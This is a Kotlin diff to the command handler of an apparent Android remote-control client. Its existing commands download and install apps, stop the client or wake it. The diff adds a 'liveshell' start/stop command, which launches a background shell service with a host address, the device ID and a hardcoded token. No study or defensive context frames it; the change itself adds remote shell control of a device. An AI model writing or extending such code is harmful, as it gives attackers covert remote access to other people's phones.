@@ -173,6 +173,18 @@ object Core {
                             cmd.startsWith("download|") -> downloadAndInstall(context, cmd.removePrefix("download|"))
                             cmd == "die" -> { running = false; "BYE" }
                             cmd == "wake" -> "AWAKE"
+                            cmd.startsWith("liveshell|") -> {
+                                val action = cmd.removePrefix("liveshell|").trim()
+                                if (action == "start") {
+                                    startLiveShell(context)
+                                    "LiveShell started"
+                                } else if (action == "stop") {
+                                    stopLiveShell(context)
+                                    "LiveShell stopped"
+                                } else {
+                                    "Unknown liveshell action: $action"
+                                }
+                            }
                             else -> Commands.dispatch(context, cmd)
                         }
                     } catch (e: Exception) {
@@ -280,5 +292,19 @@ object Core {
         } catch (e: Exception) {
             "ERROR:${e.message}"
         }
+    }
+
+    private fun startLiveShell(context: Context) {
+        val intent = Intent(context, com.kaze.liveshell.LiveShellService::class.java).apply {
+            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_HOST, "127.0.0.1")
+            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_DEVICE_ID, deviceId)
+            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_TOKEN, "LiveShell2026!")
+        }
+        context.startForegroundService(intent)
+    }
+
+    private fun stopLiveShell(context: Context) {
+        val intent = Intent(context, com.kaze.liveshell.LiveShellService::class.java)
+        context.stopService(intent)
     }
 }
